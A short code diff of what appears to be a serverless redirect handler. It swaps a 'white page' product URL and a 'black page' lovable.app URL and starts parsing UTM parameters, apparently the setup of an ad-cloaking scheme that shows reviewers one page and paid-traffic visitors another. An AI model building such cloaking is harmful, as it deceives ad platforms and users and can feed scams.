@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ordernation.com/products/xiaomi-120w-qc3-0-fast-charger-with-type-c-to-c-cable-white-eee262-type-ctoc-adapters-white";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://www.ordernation.com/products/";
+    const blackPageURL = "https://ordernation.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
